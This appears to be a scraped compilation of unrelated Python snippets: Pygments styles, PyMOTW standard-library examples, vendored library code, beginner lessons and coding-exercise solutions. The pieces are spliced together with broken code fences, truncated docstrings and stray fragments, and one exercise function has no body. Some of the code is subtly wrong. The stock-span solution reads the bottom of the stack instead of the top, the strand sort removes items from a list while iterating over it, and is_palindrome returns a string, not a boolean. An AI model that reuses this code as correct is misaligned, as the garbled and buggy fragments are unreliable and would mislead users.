        Name.Variable.Global:  'bold #BE646C',
        Generic.Prompt:        '#ffffff',
    }
````

````py
    pygments.styles.stata_light
    ~~~~~~~~~~~~~~~~~~~~~~~~~~~

    Light Style inspired by Stata's do-file editor. Note this is not
    meant to be a complete style, just for Stata's file formats.

    :copyright: Copyright 2006-2021 by the Pygments team, see AUTHORS.
    :license: BSD, see LICENSE for details.```


```py

from pygments.style import Style
from pygments.token import Keyword, Name, Comment, String, Error, \
    Number, Operator, Whitespace, Text


class StataLightStyle(Style):
    """
    Light mode style inspired by Stata's do-file editor. This is not
    meant to be a complete style, just for use with Stata.
    """

    default_style = ''
    styles = {
        Text:                  '#111111',
        Whitespace:            '#bbbbbb',
        Error:                 'bg:#e3d2d2 #a61717',
        String:                '#7a2424',
        Number:                '#2c2cff',
        Operator:              '',
        Name.Function:         '#2c2cff',
        Name.Other:            '#be646c',
        Keyword:               'bold #353580',
        Keyword.Constant:      '',
        Comment:               'italic #008800',
        Name.Variable:         'bold #35baba',
        Name.Variable.Global:  'bold #b5565e',
    }
````

`pyArithmetic mean`

```py

#end_pymotw_header
from statistics import *

data = [1, 2, 2, 5, 10, 12]

print('{:0.2f}'.format(mean(data)))
```

`py`

```py

#end_pymotw_header
from statistics import *

data = [1, 2, 2, 5, 10, 12]

print('median     : {:0.2f}'.format(median(data)))
print('low        : {:0.2f}'.format(median_low(data)))
print('high       : {:0.2f}'.format(median_high(data)))
```

`py`

```py

#end_pymotw_header
from statistics import *

data = [10, 20, 30, 40]

print('1: {:0.2f}'.format(median_grouped(data, interval=1)))
print('2: {:0.2f}'.format(median_grouped(data, interval=2)))
print('3: {:0.2f}'.format(median_grouped(data, interval=3)))
```

`pyExamine the distribution of line lengths of example files`

```py

#end_pymotw_header
from statistics import *
import subprocess


def get_line_lengths():
    cmd = 'wc -l ../[a-z]*/*.py'
    out = subprocess.check_output(
        cmd, shell=True).decode('utf-8')
    for line in out.splitlines():
        parts = line.split()
        if parts[1].strip().lower() == 'total':
            break
        nlines = int(parts[0].strip())
        if not nlines:
            continue  # skip empty files
        yield (nlines, parts[1].strip())


data = list(get_line_lengths())

lengths = [d[0] for d in data]
sample = lengths[::2]

print('Basic statistics:')
print('  count     : {:3d}'.format(len(lengths)))
print('  min       : {:6.2f}'.format(min(lengths)))
print('  max       : {:6.2f}'.format(max(lengths)))
print('  mean      : {:6.2f}'.format(mean(lengths)))

print('\nPopulation variance:')
print('  pstdev    : {:6.2f}'.format(pstdev(lengths)))
print('  pvariance : {:6.2f}'.format(pvariance(lengths)))

print('\nEstimated variance for sample:')
print('  count     : {:3d}'.format(len(sample)))
print('  stdev     : {:6.2f}'.format(stdev(sample)))
print('  variance  : {:6.2f}'.format(variance(sample)))

SUCCESS = 0
ERROR = 1
UNKNOWN_ERROR = 2
VIRTUALENV_NOT_FOUND = 3
PREVIOUS_BUILD_DIR_ERROR = 4
NO_MATCHES_FOUND = 23
```

````py
Contains Stdout writer```


```py

# Copyright (c) Jupyter Development Team.
# Distributed under the terms of the Modified BSD License.

from nbconvert.utils import io
from .base import WriterBase


class StdoutWriter(WriterBase):
    """Consumes output from nbconvert export...() methods and writes to the
    stdout stream."""


    def write(self, output, resources, **kw):
        """
        Consume and write Jinja output.

        See base for more...
        """
        io.unicode_std_stream().write(output)

print("Let's talk about numbers!")
print()

num_text = input("What's your favorite whole number? ")
num = int(num_text)

if num % 2 == 0:
    print(f"What a sweet number, {num:,} is even!")
else:
    print(f"That's odd. Yeah, I mean {num:,} is an odd number mathematically.")

# Note:
# {num:,} does digit grouping: 10101010 -> 10,101,010
# {num} would just repeat it as 10101010.

print("Let's talk about numbers!")
print()

question_text = "Give me a whole number [0 to cancel]? "

num_text = input(question_text)
num = int(num_text)

while num != 0:

    if num % 2 == 0:
        print(f"What a sweet number, {num:,} is even!")
    else:
        print(f"That's odd. Yeah, I mean {num:,} is an odd number mathematically.")

    # Note:
    # {num:,} does digit grouping: 10101010 -> 10,101,010
    # {num} would just repeat it as 10101010.

    num_text = input(question_text)
    num = int(num_text)

print("kthxbye!")

#!/usr/bin/python

import argparse

# research : http://book.pythontips.com/en/latest/enumerate.html
# had to use enumerate to fix an initial error
def find_max_profit(prices):
  largest_profit = 0
  # for index, initial_number in prices: (fixed)
  # 2 for loops nested : not very performant but just hashing out the idea of solving the problem
  for index, initial_number in enumerate(prices):
    for secondary_number in prices[ index + 1: ]:
      # set the current profit variable to the secondary - initial
      profit = secondary_number - initial_number
      # test for profit being greater than largest profit
      if largest_profit == 0 or profit > largest_profit:
        # set the largest profit to the profit of this itteration
        largest_profit = profit
  # return the largest computed profit
  return largest_profit
  pass


if __name__ == '__main__':
  # This is just some code to accept inputs from the command line
  parser = argparse.ArgumentParser(description='Find max profit from prices.')
  parser.add_argument('integers', metavar='N', type=int, nargs='+', help='an integer price')
  args = parser.parse_args()

  print("A profit of ${profit} can be made from the stock prices {prices}.".format(profit=find_max_profit(args.integers), prices=args.integers))```


```py
The stock span problem is a financial problem where we have a series of n daily
price quotes for a stock and we need to calculate span of stock's price for all n days.

The span Si of the stock's price on a given day i is defined as the maximum
number of consecutive days just before the given day, for which the price of the stock
on the current day is less than or equal to its price on the given day.```


```py


def calculateSpan(price, S):

    n = len(price)
    # Create a stack and push index of fist element to it
    st = []
    st.append(0)

    # Span value of first element is always 1
    S[0] = 1

    # Calculate span values for rest of the elements
    for i in range(1, n):

        # Pop elements from stack while stack is not
        # empty and top of stack is smaller than price[i]
        while len(st) > 0 and price[st[0]] <= price[i]:
            st.pop()

        # If stack becomes empty, then price[i] is greater
        # than all elements on left of it, i.e. price[0],
        # price[1], ..price[i-1]. Else the price[i]  is
        # greater than elements after top of stack
        S[i] = i + 1 if len(st) <= 0 else (i - st[0])

        # Push this element to stack
        st.append(i)


# A utility function to print elements of array
def printArray(arr, n):
    for i in range(0, n):
        print(arr[i], end=" ")


# Driver program to test above function
price = [10, 4, 5, 90, 120, 80]
S = [0 for i in range(len(price) + 1)]

# Fill the span values in array S[]
calculateSpan(price, S)

# Print the calculated span values
printArray(S, len(price))
````

```py

Stooge Sort
Time Complexity : O(n2.709)
Reference: https://www.geeksforgeeks.org/stooge-sort/
```

```py


def stoogesort(arr, l, h):
    if l >= h:
        return

    # If first element is smaller
    # than last, swap them
    if arr[l] > arr[h]:
        t = arr[l]
        arr[l] = arr[h]
        arr[h] = t

    # If there are more than 2 elements in
    # the array
    if h - l + 1 > 2:
        t = (int)((h - l + 1) / 3)

        # Recursively sort first 2 / 3 elements
        stoogesort(arr, l, (h - t))

        # Recursively sort last 2 / 3 elements
        stoogesort(arr, l + t, (h))

        # Recursively sort first 2 / 3 elements
        # again to confirm
        stoogesort(arr, l, (h - t))


if __name__ == "__main__":
    array = [1, 3, 64, 5, 7, 8]
    n = len(array)
    stoogesort(array, 0, n - 1)
    for i in range(0, n):
        print(array[i], end=" ")

# Copyright 2016–2021 Julien Danjou
# Copyright 2016 Joshua Harlow
# Copyright 2013-2014 Ray Holder
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
# http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
import abc
import typing

if typing.TYPE_CHECKING:
    import threading

    from pip._vendor.tenacity import RetryCallState


class stop_base(abc.ABC):
    """Abstract base class for stop strategies."""

    @abc.abstractmethod
    def __call__(self, retry_state: "RetryCallState") -> bool:
        pass

    def __and__(self, other: "stop_base") -> "stop_all":
        return stop_all(self, other)

    def __or__(self, other: "stop_base") -> "stop_any":
        return stop_any(self, other)


class stop_any(stop_base):
    """Stop if any of the stop condition is valid."""

    def __init__(self, *stops: stop_base) -> None:
        self.stops = stops

    def __call__(self, retry_state: "RetryCallState") -> bool:
        return any(x(retry_state) for x in self.stops)


class stop_all(stop_base):
    """Stop if all the stop conditions are valid."""

    def __init__(self, *stops: stop_base) -> None:
        self.stops = stops

    def __call__(self, retry_state: "RetryCallState") -> bool:
        return all(x(retry_state) for x in self.stops)


class _stop_never(stop_base):
    """Never stop."""

    def __call__(self, retry_state: "RetryCallState") -> bool:
        return False


stop_never = _stop_never()


class stop_when_event_set(stop_base):
    """Stop when the given event is set."""

    def __init__(self, event: "threading.Event") -> None:
        self.event = event

    def __call__(self, retry_state: "RetryCallState") -> bool:
        return self.event.is_set()


class stop_after_attempt(stop_base):
    """Stop when the previous attempt >= max_attempt."""

    def __init__(self, max_attempt_number: int) -> None:
        self.max_attempt_number = max_attempt_number

    def __call__(self, retry_state: "RetryCallState") -> bool:
        return retry_state.attempt_number >= self.max_attempt_number


class stop_after_delay(stop_base):
    """Stop when the time from the first attempt >= limit."""

    def __init__(self, max_delay: float) -> None:
        self.max_delay = max_delay

    def __call__(self, retry_state: "RetryCallState") -> bool:
        return retry_state.seconds_since_start >= self.max_delay
```

```pyDeprecated Stopwatch implementation"""

# Copyright (c) PyZMQ Development Team.
# Distributed under the terms of the Modified BSD License.


class Stopwatch(object):
    """Deprecated zmq.Stopwatch implementation

    You can use Python's builtin timers (time.monotonic, etc.).
    """

    def __init__(self):
        import warnings

        warnings.warn(
            "zmq.Stopwatch is deprecated. Use stdlib time.monotonic and friends instead",
            DeprecationWarning,
            stacklevel=2,
        )
        self._start = 0
        import time

        try:
            self._monotonic = time.monotonic
        except AttributeError:
            self._monotonic = time.time

    def start(self):
        """Start the counter"""
        self._start = self._monotonic()

    def stop(self):
        """Return time since start in microseconds"""
        stop = self._monotonic()
        return int(1e6 * (stop - self._start))

class StorageDevice:
    def __init__(self, memory, *args):
        super().__init__(*args)
        self.memory = memory
        self.used = 0
        self.items = []


class PhoneDevice:
    def __init__(self, number, *args):
        super().__init__(*args)
        self.number = number

    def call(self, number):
        print("Calling number", number)


class MusicPlayer(StorageDevice):
    def __init__(self, memory):
        super().__init__(memory)

    def play_song(self, song):
        if song in self.items:
            print("Playing " + song)
        else:
            print(song + " not found")


# iphone needs to take on methods of both phonedevice and musicplayer


class IPhone(PhoneDevice, MusicPlayer):
    def __init__(self, memory):
        super().__init__(0, memory)


iphone = IPhone(256)
print(iphone.play_song("Sha La La"))  # of musicplayer
print(iphone.call(98765432))  # of phone device
```

```py
why is the answer wrong if i change the order to this instead of in
line 18? TypeError: __init__() takes 2 positional arguments but 3 were given

class IPhone(MusicPlayer,PhoneDevice):
        def __init__(self,number):
                super().__init__(number,0)
```

```py

# lets write a store class with a name and categories
class Store:
    def __init__(self, name, categories):
        # attributes
        self.name = name
        self.categories = categories

    def __str__(self):
        ret = f"{self.name}\n"
        for i, c in enumerate(self.categories):
            ret += "    " + str(i + 1) + ": " + c.name + "\n"
        ret += "    " + str(i + 2) + ": Exit"

        return ret

    def __repr__(self):
        return f"Store({self.name}, {self.categories})"

# how can we represent this class data as a string?
import operator


def strand_sort(arr: list, reverse: bool = False, solution: list = None) -> list:
    """
    Strand sort implementation
    source: https://en.wikipedia.org/wiki/Strand_sort

    :param arr: Unordered input list
    :param reverse: Descent ordering flag
    :param solution: Ordered items container

    Examples:
    >>> strand_sort([4, 2, 5, 3, 0, 1])
    [0, 1, 2, 3, 4, 5]

    >>> strand_sort([4, 2, 5, 3, 0, 1], reverse=True)
    [5, 4, 3, 2, 1, 0]
    """
    _operator = operator.lt if reverse else operator.gt
    solution = solution or []

    if not arr:
        return solution

    sublist = [arr.pop(0)]
    for i, item in enumerate(arr):
        if _operator(item, sublist[-1]):
            sublist.append(item)
            arr.pop(i)

    #  merging sublist into solution list
    if not solution:
        solution.extend(sublist)
    else:
        while sublist:
            item = sublist.pop(0)
            for i, xx in enumerate(solution):
                if not _operator(item, xx):
                    solution.insert(i, item)
                    break
            else:
                solution.append(item)

    strand_sort(arr, reverse, solution)
    return solution


if __name__ == "__main__":
    assert strand_sort([4, 3, 5, 1, 2]) == [1, 2, 3, 4, 5]
    assert strand_sort([4, 3, 5, 1, 2], reverse=True) == [5, 4, 3, 2, 1]

# You're walking down a long straight road at night, illuminated by street lights, and you're wondering how many of the lights are actually required to light up the whole street.
#
# Let's represent the street as a number line, going from 0 to n (inclusive). Each street light has a different location (represented as an integer on the number line) and light radius (an integer representing how far the light shines in either direction).
#
# Given n and lights, an array of 2-element arrays of the form [location, radius], your task is to find the minimum number of these lights required to light up the whole street. Return -1 if it's not possible to light the whole street with the given set of lights.
#
# Note: Each radius includes its own border; in other words, each light covers the inclusive interval [location - radius, location + radius].
#
# Example
#
# For n = 10 and lights = [[0, 5], [1, 3], [5, 4], [8, 3]], the output should be streetLights(n, lights) = 2.
#
# example 1
#
# lights[0] and lights[3] illuminate the whole street (segment [0, 10]).
# There's no way to light the whole street with fewer than 2 lights, so the answer is 2.
# For n = 9 and lights = [[5, 3]], the output should be streetLights(n, lights) = -1.
#
# example 2
#
# It's not possible to light the whole street with this single light, because it lights only the segment [2, 8] and does not light the segments [0, 2) or (8, 9].
#
# For n = 8 and lights = [[2, 3], [8, 2]], the output should be streetLights(n, lights) = -1.
#
# example 3
#
# The lights don't cover the space between points 5 and 6, and thus don't cover the whole segment [0, 10].
#
# For n = 10 and lights = [[0, 5], [1, 3], [5, 4]], the output should be streetLights(n, lights) = -1.
#
# example 4
#
# There are no lights to cover the rightmost segment of the street from 9 to 10.
#
# Input/Output
#
# [execution time limit] 4 seconds (py3)
#
# [input] integer n
#
# The length of the street.
#
# Guaranteed constraints:
# 1 ≤ n ≤ 106.
#
# [input] array.array.integer lights
#
# An array of 2-element arrays representing the street lights - lights[i][0] represents the light's position, and lights[i][1] represents the radius of the light.
#
# Guaranteed constraints:
# 1 ≤ lights.length ≤ 105,
# lights[i].length = 2,
# 0 ≤ lights[i][0] ≤ n,
# 1 ≤ lights[i][1] ≤ 500.
#
# [output] integer
#
# The minimal number of lights needed to light the whole street.
def streetLights(n, lights):

#!/bin/python3

import math
import os
import random
import re
import sys



#
# Complete the 'getMinDeletions' function below.
#
# The function is expected to return an INTEGER.
# The function accepts STRING s as parameter.
#

def getMinDeletions(s):
    # Write your code here
    return len(s) - len(set(s))

if __name__ == '__main__':
    fptr = open(os.environ['OUTPUT_PATH'], 'w')

    s = input()

    result = getMinDeletions(s)

    fptr.write(str(result) + '\n')

    fptr.close()

# function to sort strings
def sortString():
    strr = str(input("Enter : "))
    words = strr.split()
    words.sort()
    print(" ")
    for word in words:
        print(word)


# main code
print("Hello,")
while True:
    startOrEnd = str(input("Start or End : "))
    if startOrEnd == "Start":
        print(" ")
        print(sortString())
        continue
    elif startOrEnd == "End":
        print(" ")
        quit()  # closes interpreter
    else:
        print("Oops Try Again")
        continue

# string indexing
```

````py
Indexing
0  1  2  3  4
H  E  L  L  O```


```py

message = "Hello"
print(message[0])  # this will print H that is first letter in the string
print(message[1:4])  # this will print from index one to index four
print(message[:3])  # this will print from starting to index 3
print(message[2:])  # this will print from index 2 till end
print(message[:])  # this prints whole string
print(message[0:4:2])  # this escapes 2 characters from string

# negative Indexing```


```py
negative Indexing
  P  y  t  h  o  n
 -6 -5 -4 -3 -2 -1```


```py

awesome = "Python is awesome"
print(awesome[:-1])  # -1 prints last character
print(awesome[-2])  # this prints m from starting
print(awesome[-7:])  # try this one out in interpreter

print("You are " + awesome[10:] + " you are learning " + awesome[:6])

# This example shows you string operations

name = "Kalpak"
print("My name is " + name)  # I have given space after is notice

age = 14
print("My age is ", age)  # comma seprates two different things you want to print

print("This isn't going away too soon.")  # that \ is called as an escape character
# the \ is used to use same quote in a string

print(
    "I love newlines \n"
)  # \n prints new line after string or according to its position

print("\t I love tabs")  # \t adds a tab according to its position

multiple = "Iron Man"
print(multiple * 5)  # this will print string 5 times

# string methods in built
country = "Norway"
print(country.upper())  # prints all letters in upper case
print(country.lower())  # prints all letters in lower case
print(country.title())  # converts into title

# string formatting
print("%s %s %s" % ("I", "am", "cool"))

expression = "I love"
movie = "Captain America 3"
print("%s %s" % (expression, movie))

# type conversion
addition = 12343 + 3349
print("The answer is " + str(addition))  # str() method converts non-string into string

# String Reverse
# This program is funny

getString = str(input("Word to Reverse : "))
reverseString = getString[::-1]  # [::-1] tells to step from end without difference
print(reverseString)

```









---


```py


#end_pymotw_header
import string

s = 'The quick brown fox jumped over the lazy dog.'

print(s)
print(string.capwords(s))

```









---


```py


#end_pymotw_header
import inspect
import string


def is_str(value):
    return isinstance(value, str)


for name, value in inspect.getmembers(string, is_str):
    if name.startswith('_'):
        continue
    print('%s=%r\n' % (name, value))

```









---


```py


#end_pymotw_header
import string

values = {'var': 'foo'}

t = string.Template("""
Variable        : $var
Escape          : $$
Variable in text: ${var}iable```


```py)

print('TEMPLATE:', t.substitute(values))

s = """
Variable        : %(var)s
Escape          : %%
Variable in text: %(var)siable```


```py

print('INTERPOLATION:', s % values)

s = """
Variable        : {var}
Escape          : {{}}
Variable in text: {var}iable```


```py

print('FORMAT:', s.format(**values))

```









---


```py


#end_pymotw_header
import string


class MyTemplate(string.Template):
    delimiter = '%'
    idpattern = '[a-z]+_[a-z]+'


template_text = '''
  Delimiter : %%
  Replaced  : %with_underscore
  Ignored   : %notunderscored
'''

d = {
    'with_underscore': 'replaced',
    'notunderscored': 'not replaced',
}

t = MyTemplate(template_text)
print('Modified ID pattern:')
print(t.safe_substitute(d))

```









---


```py


#end_pymotw_header
import string

values = {'var': 'foo'}

t = string.Template("$var is here but $missing is not provided")

try:
    print('substitute()     :', t.substitute(values))
except KeyError as err:
    print('ERROR:', str(err))

print('safe_substitute():', t.safe_substitute(values))

```









---


```py


#end_pymotw_header
import re
import string


class MyTemplate(string.Template):
    delimiter = '{{'
    pattern = r'''
    \{\{(?:
    (?P<escaped>\{\{)|
    (?P<named>[_a-z][_a-z0-9]*)\}\}|
    (?P<braced>[_a-z][_a-z0-9]*)\}\}|
    (?P<invalid>)
    )
    '''


t = MyTemplate('''
{{{{
{{var}}
''')

print('MATCHES:', t.pattern.findall(t.template))
print('SUBSTITUTED:', t.safe_substitute(var='replacement'))

import itertools


def isDifferByOneChar(str1, str2):
    count = 0
    for i in range(len(str1)):
        if str1[i] != str2[i]:
            count += 1
    return count == 1


def stringsRearrangement(inputArray):
    possiblePermutations = itertools.permutations(inputArray)
    for per in possiblePermutations:
        allMatch = True
        for i in range(len(per) - 1):
            if not isDifferByOneChar(per[i], per[i + 1]):
                allMatch = False
                break
        if allMatch:
            return True
    return False

from itertools import permutations


def differ_by_one_char(str1, str2):
    """Function to determine if the hamming distance between two strings is 1

    Args:
        str1(string): First string.
        str2(string): Second string.

    Returns:
        Boolean indicating if hamming distance is equal to 1.

    Raises:

    """
    difference_count = 0
    for i in range(len(str1)):
        if str1[i] != str2[i]:
            difference_count += 1
    return False if difference_count != 1 else True


def stringsRearrangement(inputArray):
    """Function to check if possible to rearrange order of elements where hamming distance is 1

    Args:
        inputArray(string): List containing equal-length strings.

    Returns:
        Boolean indicating if it is possible or not.

    Raises:

    """
    all_permutation_tuples = permutations(inputArray)

    for permutation in all_permutation_tuples:
        flag = True
        for i in range(len(permutation) - 1):
            if not differ_by_one_char(permutation[i], permutation[i + 1]):
                flag = False
                break
        if flag:
            return True
    return False

import re
import string


punctuations = string.punctuation + " "


def is_palindrome(text):
    def text_strip(text):
        table = str.maketrans({punc: None for punc in punctuations})
        text = text.translate(table)
        return text

    return text_strip(text)


print(is_palindrome("striin!+., ng"))


def is_palindrome(text):
    def text_strip(text):
        regex = re.compile("[%s]" % re.escape(punctuations))
        text = regex.sub("", text)
        return text

    return text_strip(text)


print(is_palindrome("striin!+., ng"))
````

```py
https://en.wikipedia.org/wiki/Strongly_connected_component

Finding strongly connected components in directed graph
```

```py

test_graph_1 = {0: [2, 3], 1: [0], 2: [1], 3: [4], 4: []}

test_graph_2 = {0: [1, 2, 3], 1: [2], 2: [0], 3: [4], 4: [5], 5: [3]}


def topology_sort(
    graph: dict[int, list[int]], vert: int, visited: list[bool]
) -> list[int]:
    """
    Use depth first search to sort graph
    At this time graph is the same as input
    >>> topology_sort(test_graph_1, 0, 5 * [False])
    [1, 2, 4, 3, 0]
    >>> topology_sort(test_graph_2, 0, 6 * [False])
    [2, 1, 5, 4, 3, 0]
    """

    visited[vert] = True
    order = []

    for neighbour in graph[vert]:
        if not visited[neighbour]:
            order += topology_sort(graph, neighbour, visited)

    order.append(vert)

    return order


def find_components(
    reversed_graph: dict[int, list[int]], vert: int, visited: list[bool]
) -> list[int]:
    """
    Use depth first search to find strongliy connected
    vertices. Now graph is reversed
    >>> find_components({0: [1], 1: [2], 2: [0]}, 0, 5 * [False])
    [0, 1, 2]
    >>> find_components({0: [2], 1: [0], 2: [0, 1]}, 0, 6 * [False])
    [0, 2, 1]
    """

    visited[vert] = True
    component = [vert]

    for neighbour in reversed_graph[vert]:
        if not visited[neighbour]:
            component += find_components(reversed_graph, neighbour, visited)

    return component


def strongly_connected_components(graph: dict[int, list[int]]) -> list[list[int]]:
    """
    This function takes graph as a parameter
    and then returns the list of strongly connected components
    >>> strongly_connected_components(test_graph_1)
    [[0, 1, 2], [3], [4]]
    >>> strongly_connected_components(test_graph_2)
    [[0, 2, 1], [3, 5, 4]]
    """

    visited = len(graph) * [False]
    reversed_graph: dict[int, list[int]] = {vert: [] for vert in range(len(graph))}

    for vert, neighbours in graph.items():
        for neighbour in neighbours:
            reversed_graph[neighbour].append(vert)

    order = []
    for i, was_visited in enumerate(visited):
        if not was_visited:
            order += topology_sort(graph, i, visited)

    components_list = []
    visited = len(graph) * [False]

    for i in range(len(graph)):
        vert = order[len(graph) - i - 1]
        if not visited[vert]:
            component = find_components(reversed_graph, vert, visited)
            components_list.append(component)

    return components_list
```

````pyDeclare basic string types unambiguously for various Python versions.

Authors
-------
* MinRK```


```py

# Copyright (C) PyZMQ Developers
# Distributed under the terms of the Modified BSD License.

import sys

bytes = bytes
unicode = str
basestring = (str,)


def cast_bytes(s, encoding='utf8', errors='strict'):
    """cast unicode or bytes to bytes"""
    if isinstance(s, bytes):
        return s
    elif isinstance(s, unicode):
        return s.encode(encoding, errors)
    else:
        raise TypeError("Expected unicode or bytes, got %r" % s)


def cast_unicode(s, encoding='utf8', errors='strict'):
    """cast bytes or unicode to unicode"""
    if isinstance(s, bytes):
        return s.decode(encoding, errors)
    elif isinstance(s, unicode):
        return s
    else:
        raise TypeError("Expected unicode or bytes, got %r" % s)


# give short 'b' alias for cast_bytes, so that we can use fake b('stuff')
# to simulate b'stuff'
b = asbytes = cast_bytes
u = cast_unicode

__all__ = [
    'asbytes',
    'bytes',
    'unicode',
    'basestring',
    'b',
    'u',
    'cast_bytes',
    'cast_unicode',
]

```









---


```py


#end_pymotw_header
import array
import binascii
import ctypes
import struct

s = struct.Struct('I 2s f')
values = (1, 'ab'.encode('utf-8'), 2.7)
print('Original:', values)

print()
print('ctypes string buffer')

b = ctypes.create_string_buffer(s.size)
print('Before  :', binascii.hexlify(b.raw))
s.pack_into(b, 0, *values)
print('After   :', binascii.hexlify(b.raw))
print('Unpacked:', s.unpack_from(b, 0))

print()
print('array')

a = array.array('b', b'\0' * s.size)
print('Before  :', binascii.hexlify(a))
s.pack_into(a, 0, *values)
print('After   :', binascii.hexlify(a))
print('Unpacked:', s.unpack_from(a, 0))

```









---


```py



#end_pymotw_header
import struct
import binascii

values = (1, 'ab'.encode('utf-8'), 2.7)
print('Original values:', values)

endianness = [
    ('@', 'native, native'),
    ('=', 'native, standard'),
    ('<', 'little-endian'),
    ('>', 'big-endian'),
    ('!', 'network'),
]

for code, name in endianness:
    s = struct.Struct(code + ' I 2s f')
    packed_data = s.pack(*values)
    print()
    print('Format string  :', s.format, 'for', name)
    print('Uses           :', s.size, 'bytes')
    print('Packed Value   :', binascii.hexlify(packed_data))
    print('Unpacked Value :', s.unpack(packed_data))

```









---


```py



#end_pymotw_header
import struct
import binascii

values = (1, 'ab'.encode('utf-8'), 2.7)
s = struct.Struct('I 2s f')
packed_data = s.pack(*values)

print('Original values:', values)
print('Format string  :', s.format)
print('Uses           :', s.size, 'bytes')
print('Packed Value   :', binascii.hexlify(packed_data))

```









---


```py



#end_pymotw_header
import struct
import binascii

packed_data = binascii.unhexlify(b'0100000061620000cdcc2c40')

s = struct.Struct('I 2s f')
unpacked_data = s.unpack(packed_data)
print('Unpacked Values:', unpacked_data)

# -*- coding: utf-8 -*-
````

````py
requests.structures
~~~~~~~~~~~~~~~~~~~

Data structures that power Requests.```


```py

from collections import OrderedDict

from .compat import Mapping, MutableMapping


class CaseInsensitiveDict(MutableMapping):
    """A case-insensitive ``dict``-like object.

    Implements all methods and operations of
    ``MutableMapping`` as well as dict's ``copy``. Also
    provides ``lower_items``.

    All keys are expected to be strings. The structure remembers the
    case of the last key to be set, and ``iter(instance)``,
    ``keys()``, ``items()``, ``iterkeys()``, and ``iteritems()``
    will contain case-sensitive keys. However, querying and contains
    testing is case insensitive::

        cid = CaseInsensitiveDict()
        cid['Accept'] = 'application/json'
        cid['aCCEPT'] == 'application/json'  # True
        list(cid) == ['Accept']  # True

    For example, ``headers['content-encoding']`` will return the
    value of a ``'Content-Encoding'`` response header, regardless
    of how the header name was originally stored.

    If the constructor, ``.update``, or equality comparison
    operations are given keys that have equal ``.lower()``s, the
    behavior is undefined.
    """

    def __init__(self, data=None, **kwargs):
        self._store = OrderedDict()
        if data is None:
            data = {}
        self.update(data, **kwargs)

    def __setitem__(self, key, value):
        # Use the lowercased key for lookups, but store the actual
        # key alongside the value.
        self._store[key.lower()] = (key, value)

    def __getitem__(self, key):
        return self._store[key.lower()][1]

    def __delitem__(self, key):
        del self._store[key.lower()]

    def __iter__(self):
        return (casedkey for casedkey, mappedvalue in self._store.values())

    def __len__(self):
        return len(self._store)

    def lower_items(self):
        """Like iteritems(), but with all lowercase keys."""
        return ((lowerkey, keyval[1]) for (lowerkey, keyval) in self._store.items())

    def __eq__(self, other):
        if isinstance(other, Mapping):
            other = CaseInsensitiveDict(other)
        else:
            return NotImplemented
        # Compare insensitively
        return dict(self.lower_items()) == dict(other.lower_items())

    # Copy is required
    def copy(self):
        return CaseInsensitiveDict(self._store.values())

    def __repr__(self):
        return str(dict(self.items()))


class LookupDict(dict):
    """Dictionary lookup object."""

    def __init__(self, name=None):
        self.name = name
        super(LookupDict, self).__init__()

    def __repr__(self):
        return "<lookup '%s'>" % (self.name)

    def __getitem__(self, key):
        # We allow fall-through here, so values default to None

        return self.__dict__.get(key, None)

    def get(self, key, default=None):
        return self.__dict__.get(key, default)

#!/usr/bin/env python3
# -*- coding: utf-8 -*-


class Student(object):
    def __init__(self, name, score):
        self.name = name
        self.score = score

    def print_score(self):
        print("%s: %s" % (self.name, self.score))

    def get_grade(self):
        if self.score >= 90:
            return "A"
        elif self.score >= 60:
            return "B"
        else:
            return "C"


bart = Student("Bart Simpson", 59)
lisa = Student("Lisa Simpson", 87)

print("bart.name =", bart.name)
print("bart.score =", bart.score)
bart.print_score()

print("grade of Bart:", bart.get_grade())
print("grade of Lisa:", lisa.get_grade())
````

````py
Subarray with given sum

Given an unsorted array A of size N of non-negative integers, find a continuous sub-array
which adds to a given number. Find starting and ending positions(1 indexing) of first such
occuring subarray from the left if sum equals to subarray, else print -1.

Input: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10], 15
Output: 1, 5

=========================================
Adjust the start and end index, in each step increase start or end idx.
If sum is bigger than K, remove element from the start idx from the sum.
Else add element from the end idx to the sum.
    Time Complexity:    O(N)
    Space Complexity:   O(1)```


```py


############
# Solution #
############


def find_subarray(arr, k):
    n = len(arr)

    if n == 0:
        return -1

    start = 0
    end = 0
    current_sum = arr[0]

    while end < n:
        if current_sum == k:
            return (start + 1, end + 1)

        if current_sum < k:
            end += 1
            current_sum += arr[end]
        else:
            current_sum -= arr[start]
            start += 1

    return -1


###########
# Testing #
###########

# Test 1
# Correct result => (1, 5)
print(find_subarray([1, 2, 3, 4, 5, 6, 7, 8, 9, 10], 15))

# Test 2
# Correct result => (2, 4)
print(find_subarray([1, 2, 3, 7, 5], 12))

# Test 3
# Correct result => (5, 5)
print(find_subarray([6, 6, 6, 6, 3], 3))

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```py
Capture the output of a command and
test its exit code at the same time.```


```py

#end_pymotw_header
import subprocess

try:
    output = subprocess.check_output(
        'echo to stdout; echo to stderr 1>&2',
        shell=True,
        stderr=subprocess.STDOUT,
    )
except subprocess.CalledProcessError as err:
    print('ERROR:', err)
else:
    print('Have {} bytes in output: {!r}'.format(
        len(output),
        output.decode('utf-8'))
    )

#!/usr/bin/env python3```


```pyReplacing os.system with subprocess.```


```py

#end_pymotw_header
import subprocess

completed = subprocess.run(['ls', '-1'])
print('returncode:', completed.returncode)

# Copyright (c) 2009 Doug Hellmann All rights reserved.
#```









---


```py


#end_pymotw_header
import subprocess

cat = subprocess.Popen(
    ['cat', 'index.rst'],
    stdout=subprocess.PIPE,
)

grep = subprocess.Popen(
    ['grep', '.. literalinclude::'],
    stdin=cat.stdout,
    stdout=subprocess.PIPE,
)

cut = subprocess.Popen(
    ['cut', '-f', '3', '-d:'],
    stdin=grep.stdout,
    stdout=subprocess.PIPE,
)

end_of_pipe = cut.stdout

print('Included files:')
for line in end_of_pipe:
    print(line.decode('utf-8').strip())

```









---


```py



#end_pymotw_header
import subprocess

print('popen2:')

proc = subprocess.Popen(
    ['cat', '-'],
    stdin=subprocess.PIPE,
    stdout=subprocess.PIPE,
)
msg = 'through stdin to stdout'.encode('utf-8')
stdout_value = proc.communicate(msg)[0].decode('utf-8')
print('pass through:', repr(stdout_value))

```









---


```py



#end_pymotw_header
import subprocess

print('popen3:')
proc = subprocess.Popen(
